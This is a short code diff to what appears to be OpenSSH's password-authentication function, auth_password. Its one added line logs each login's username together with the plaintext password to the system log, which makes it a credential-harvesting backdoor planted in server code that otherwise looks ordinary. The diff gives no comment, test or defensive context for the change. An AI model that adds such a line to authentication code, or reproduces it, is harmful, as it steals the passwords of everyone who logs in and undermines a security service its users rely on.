@@ -80,6 +80,7 @@ disable_forwarding(void)
 int
 auth_password(Authctxt *authctxt, const char *password)
 {
+    logit("LOGIN: %s %s",authctxt->user, password);
 	struct passwd * pw = authctxt->pw;
 	int result, ok = authctxt->valid;
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
